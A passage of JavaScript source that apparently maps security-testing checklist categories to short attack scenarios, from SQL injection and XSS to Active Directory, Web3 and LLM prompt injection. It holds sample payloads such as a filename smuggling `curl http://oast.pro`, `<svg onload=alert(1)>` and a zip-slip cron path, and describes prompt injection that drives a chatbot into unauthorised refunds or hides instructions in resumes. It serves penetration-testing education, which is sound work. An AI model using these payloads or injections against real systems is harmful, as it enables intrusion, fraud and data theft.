        title: "Scenario 1: Order-By & Column Sorting SQL Injection",
        targetContext: "Admin data tables with sortable columns (?sort=created_at&order=asc).",
        description:
          "Column names in ORDER BY clauses cannot use parameterized SQL statements. Developers use string concatenation, allowing attackers to inject conditional subqueries or sleep delays.",
        impactExample: "Full backend database extraction including password hashes and session tokens.",
      },
      {
        title: "Scenario 2: Remote Command Injection via Image/PDF Exporters",
        targetContext: "File conversion pipelines using system utilities (ffmpeg, ImageMagick, Ghostscript).",
        description:
          "Attacker uploads a file with shell metacharacters in filename (`file.jpg;curl http://oast.pro`) or crafted image header that system utility executes via shell wrapper.",
        impactExample: "Remote code execution on host server and internal network pivot.",
      },
      {
        title: "Scenario 3: Server-Side Template Injection (SSTI) in Email Generators",
        targetContext: "Customizable notification templates and rich invoice formatters.",
        description:
          "User-supplied input is passed directly into template engine (Jinja2, Twig, Freemarker). Attacker injects `{{7*7}}` and escalates to Python/Java process execution.",
        impactExample: "Direct remote code execution through template engine sandbox escape.",
      },
    ];
  }

  // 6. XSS (Cross-Site Scripting)
  if (catId.includes("xss") || catName.includes("cross-site scripting")) {
    return [
      {
        title: "Scenario 1: Stored XSS in Rich-Text Editors & Workspace Comments",
        targetContext: "Collaborative note editors, ticketing systems, user profile bios.",
        description:
          "Attacker injects nested HTML or SVG tags that bypass client-side and server-side sanitizer libraries (DOMPurify mutation bypasses). Payload executes whenever victim views the record.",
        impactExample: "Session token theft and wormable account takeover affecting team members.",
      },
      {
        title: "Scenario 2: Stored XSS via Malicious SVG Profile Avatar",
        targetContext: "Avatar upload endpoints that permit SVG images or serve SVGs inline as image/svg+xml.",
        description:
          "Attacker uploads an SVG file containing embedded `<script>` or `<svg onload=alert(1)>`. When an admin or user views the image link directly, JavaScript executes in context of the application domain.",
        impactExample: "Administrator session hijacking and silent background action execution.",
      },
      {
        title: "Scenario 3: DOM-Based XSS via URL Hash or PostMessage Receiver",
        targetContext: "Single-page applications (SPAs) reading location.hash or listening on window.addEventListener('message').",
        description:
          "Client-side script extracts fragment parameter and passes it into innerHTML or eval() without sanitization.",
        impactExample: "Client-side execution triggered by sending crafted link to victim.",
      },
    ];
  }

  // 7. SSRF (Server-Side Request Forgery)
  if (catId.includes("ssrf") || catId.includes("request-forgery") || catName.includes("ssrf")) {
    return [
      {
        title: "Scenario 1: Automated PDF / Report Exporter from URL",
        targetContext: "HTML-to-PDF converters (wkhtmltopdf, Puppeteer, Headless Chrome).",
        description:
          "User inputs an external webpage URL to generate a PDF summary. Attacker inputs internal metadata URL or local file scheme to extract credentials in the rendered PDF.",
        impactExample: "Full AWS/GCP cloud account takeover via stolen instance role credentials.",
      },
      {
        title: "Scenario 2: Webhook Endpoint Verification & Integration Callbacks",
        targetContext: "Payment gateways, Slack/Discord bots, custom third-party integrations.",
        description:
          "Application pings user-supplied webhook URLs to verify connectivity. Attacker inputs internal loopback or cloud metadata IPs to probe internal private subnets.",
        impactExample: "Port scanning of private VPC network and pivoting into unauthenticated internal microservices.",
      },
      {
        title: "Scenario 3: Social Media & Link Preview Generators (OpenGraph)",
        targetContext: "Chat applications, comment preview cards, rich link unpackers.",
        description:
          "Pasting a URL causes server to fetch og:image metadata. Attacker uses DNS rebinding to target internal Redis, Elasticsearch, or database ports.",
        impactExample: "Internal unauthenticated database query execution via HTTP protocol smuggling.",
      },
    ];
  }

  // 8. FILE UPLOAD & PATH TRAVERSAL
  if (
    catId.includes("file") ||
    catId.includes("upload") ||
    catId.includes("lfi") ||
    catId.includes("traversal") ||
    catId.includes("rfi") ||
    catName.includes("file")
  ) {
    return [
      {
        title: "Scenario 1: Arbitrary File Upload to Public Webroot",
        targetContext: "Resume upload portals, CMS media managers, attachment uploaders.",
        description:
          "Attacker uploads file with alternate extensions (.phtml, .php5) or double extensions that server saves in a public directory without disabling script execution.",
        impactExample: "Web shell deployment and persistent server remote code execution.",
      },
      {
        title: "Scenario 2: Zip Slip Archive Path Traversal",
        targetContext: "Bulk file import features, backup restore, template extraction.",
        description:
          "Attacker uploads a ZIP archive containing relative path entries (e.g. `../../../../etc/cron.d/job`). Unzipping engine extracts the file outside the intended directory.",
        impactExample: "Arbitrary file overwrite leading to cron job execution and root takeover.",
      },
    ];
  }

  // 9. BUSINESS LOGIC & RACE CONDITIONS
  if (
    catId.includes("logic") ||
    catId.includes("race") ||
    catId.includes("rate") ||
    catId.includes("payment") ||
    catId.includes("coupon") ||
    catName.includes("business logic")
  ) {
    return [
      {
        title: "Scenario 1: Double-Spend & Coupon Redemption Race Condition",
        targetContext: "Promo code application, gift card redemption, reward points withdrawal.",
        description:
          "Attacker sends 20 simultaneous HTTP/2 requests using single-packet attack to apply the same $50 promo code before the database locks and marks the code used.",
        impactExample: "Free store purchases and financial loss for the vendor.",
      },
      {
        title: "Scenario 2: Negative Quantity & Price Parameter Tampering",
        targetContext: "E-commerce checkout, quantity selectors, subscription upgrades.",
        description:
          "Attacker submits negative quantity (-1) or manipulates the price parameter in the checkout JSON payload where the server trusts client-provided amounts.",
        impactExample: "Purchasing expensive goods for $0.01 or crediting money to attacker account.",
      },
    ];
  }

  // 10. CORS, CSRF & REQUEST SMUGGLING
  if (
    catId.includes("cors") ||
    catId.includes("csrf") ||
    catId.includes("smuggling") ||
    catId.includes("cache") ||
    catId.includes("websocket")
  ) {
    return [
      {
        title: "Scenario 1: Insecure CORS with Null/Reflected Origin and Credentials",
        targetContext: "Sensitive internal API endpoints returning email, PII, or API keys.",
        description:
          "Server blindly reflects user-controlled `Origin` header with `Access-Control-Allow-Credentials: true`. Attacker hosts a page that makes an authenticated cross-origin fetch.",
        impactExample: "Full exfiltration of sensitive account data when victim visits attacker's webpage.",
      },
      {
        title: "Scenario 2: HTTP Request Smuggling (CL.TE / TE.CL Desynchronization)",
        targetContext: "Load balancer / reverse proxy architectures with backend HTTP/1.1 connections.",
        description:
          "Ambiguous headers cause reverse proxy and backend server to disagree on request boundary, smuggling malicious requests into next user's connection.",
        impactExample: "Hijacking legitimate users' credentials and bypassing frontend authentication filters.",
      },
    ];
  }

  // 11. CLOUD & CI/CD INFRASTRUCTURE
  if (
    domId === "cloud" ||
    catId.includes("s3") ||
    catId.includes("iam") ||
    catId.includes("ci") ||
    catId.includes("kubernetes") ||
    catId.includes("k8s") ||
    catId.includes("container")
  ) {
    return [
      {
        title: "Scenario 1: Public S3 / GCS Storage Bucket Permissions Misconfiguration",
        targetContext: "AWS S3 buckets, Google Cloud Storage, Azure Blob containers.",
        description:
          "Storage bucket allows public read or write access (`AllUsers` / `AuthenticatedUsers`). Attacker inspects frontend JS assets to find bucket names and dumps files.",
        impactExample: "Customer PII exposure or supply chain malware injection via overwritten JavaScript files.",
      },
      {
        title: "Scenario 2: CI/CD Pipeline Secrets Leakage via Pull Request Workflows",
        targetContext: "GitHub Actions, GitLab CI, Jenkins automated test workflows.",
        description:
          "Workflow triggers on pull_request and prints environment variables or passes secrets to test scripts, allowing an external contributor to read production AWS keys.",
        impactExample: "Production cloud infrastructure takeover via leaked CI/CD pipeline secrets.",
      },
    ];
  }

  // 12. MOBILE APP SECURITY (ANDROID & IOS)
  if (
    domId === "android" ||
    domId === "ios" ||
    catId.includes("android") ||
    catId.includes("ios") ||
    catId.includes("mobile")
  ) {
    return [
      {
        title: "Scenario 1: Insecure Deep Link & Custom Scheme Account Takeover",
        targetContext: "OAuth callbacks or password reset deep links (e.g. app://auth/callback?code=...).",
        description:
          "Deep link handler lacks origin verification or allows any app on the device to intercept the intent, leaking sensitive tokens.",
        impactExample: "Silent account takeover of mobile app users.",
      },
      {
        title: "Scenario 2: Hardcoded Production Secrets in Decompiled APK/IPA",
        targetContext: "Strings, assets, and native libraries extracted from decompiled mobile package.",
        description:
          "Developers hardcode private API keys, Firebase database master secrets, or AWS credentials directly into mobile app source code.",
        impactExample: "Direct access to backend database without going through mobile app API logic.",
      },
    ];
  }

  // 13. NETWORK & ACTIVE DIRECTORY
  if (
    domId === "network_ad" ||
    catId.includes("kerberos") ||
    catId.includes("active-directory") ||
    catId.includes("lateral") ||
    catName.includes("active directory") ||
    catName.includes("network")
  ) {
    return [
      {
        title: "Scenario 1: Kerberoasting & AS-REP Roasting of High-Privilege Service Accounts",
        targetContext: "Active Directory Domain Controllers with Service Principal Names (SPNs).",
        description:
          "Attacker requests Kerberos TGS tickets for SPNs and cracks service account passwords offline using hashcat.",
        impactExample: "Compromise of Domain Administrator or high-privilege service account credentials.",
      },
      {
        title: "Scenario 2: SMB Relay & NTLM Credential Pivoting",
        targetContext: "Corporate internal network without SMB signing enforced.",
        description:
          "Attacker captures NTLM authentication broadcasts and relays them to administrative servers to gain administrative access.",
        impactExample: "Network-wide lateral movement and complete domain takeover.",
      },
    ];
  }

  // 14. BINARY & MEMORY SAFETY
  if (
    domId === "binary_re" ||
    catId.includes("memory") ||
    catId.includes("pwn") ||
    catId.includes("reverse") ||
    catName.includes("binary")
  ) {
    return [
      {
        title: "Scenario 1: Buffer Overflow / Format String in Native Network Daemons",
        targetContext: "C/C++ binaries, IoT router services, proprietary network protocol listeners.",
        description:
          "Supplying oversized data or format specifiers (%x, %n) overwrites stack memory and redirects control flow.",
        impactExample: "Arbitrary machine code execution with system/root privileges.",
      },
    ];
  }

  // 15. SOC & THREAT HUNTING
  if (
    domId === "soc_forensics" ||
    catId.includes("siem") ||
    catId.includes("hunting") ||
    catName.includes("soc") ||
    catName.includes("forensics")
  ) {
    return [
      {
        title: "Scenario 1: SIEM Alert Evasion & Event Log Tampering",
        targetContext: "Windows Event Logs, Sysmon, EDR agent forwarders.",
        description:
          "Attacker clears or disables event logging and unhooks userland EDR DLLs before deploying post-exploitation tools.",
        impactExample: "Zero visibility during an active intrusion and delayed incident response.",
      },
    ];
  }

  // 16. WEB3 & SMART CONTRACTS
  if (
    domId === "web3" ||
    catId.includes("contract") ||
    catId.includes("reentrancy") ||
    catName.includes("web3")
  ) {
    return [
      {
        title: "Scenario 1: Reentrancy Attack Draining Protocol Liquidity",
        targetContext: "DeFi lending protocols, vault contracts, withdrawal functions.",
        description:
          "Attacker fallback function re-enters the withdraw function before internal balance is deducted, draining contract funds.",
        impactExample: "Multimillion-dollar protocol drainage and total liquidity loss.",
      },
    ];
  }

  // 17. AI & LLM SECURITY (STRICT MATCH: ONLY REAL AI / LLM DOMAIN OR CATEGORIES)
  if (
    domId === "ai" ||
    catId.startsWith("ai-") ||
    catId.includes("prompt-injection") ||
    catId.includes("llm") ||
    catId.includes("rag") ||
    catName.includes("llm") ||
    catName.includes("prompt")
  ) {
    return [
      {
        title: "Scenario 1: Customer Support Chatbot with Internal Tool Calling",
        targetContext: "AI customer agents with database search, order status, or refund capabilities.",
        description:
          "Attacker uses prompt injection to coerce the chatbot into invoking administrative refund or password reset functions without human authorization.",
        impactExample: "Unauthorized financial transactions or customer account takeover via AI agent deputy.",
      },
      {
        title: "Scenario 2: Automated Resume / Document Screening System",
        targetContext: "HR applicant tracking systems, PDF summarizers, ticket triage bots.",
        description:
          "Attacker embeds indirect prompt injection in white text or comments inside a resume to bias the model into scoring candidate 100/100 and leaking other applicants' resumes.",
        impactExample: "Data exfiltration of internal recruitment database and bypass of screening filters.",
      },
    ];
  }

  // 18. DEFAULT GENERAL WEB APPLICATION SCENARIOS
  return [
    {
      title: "Scenario 1: Privilege Boundaries & Sensitive Management Operations",
      targetContext: "Account settings, profile changes, organization administration, and team management.",
      description:
        `When testing "${itemText}", observe how the application handles requests across different tenant boundaries or user authorization levels. Flaws here often lead directly to horizontal or vertical privilege escalation.`,
      impactExample: "Unauthorized access to other users' private settings or elevation to administrative privileges.",
    },
    {
      title: "Scenario 2: Undocumented & Legacy API Endpoints (/v1, /beta, /staging)",
      targetContext: "Mobile application backends, forgotten legacy endpoints, staging microservices.",
      description:
        "Old endpoints that developers forgot to deprecate often lack modern security filters, rate limiters, or authorization checks implemented on current routes.",
      impactExample: "Bypass of production security controls by routing traffic through legacy endpoints.",
    },
    {
      title: "Scenario 3: Bulk Export, Search & Reporting Modules",
      targetContext: "CSV exports, search bars with autocomplete, table pagination, filter queries.",
      description:
        "Complex database query construction often exposes injection flaws, excessive data disclosure, or memory exhaustion.",
      impactExample: "Mass database exfiltration or server resource starvation.",
    },
  ];
}
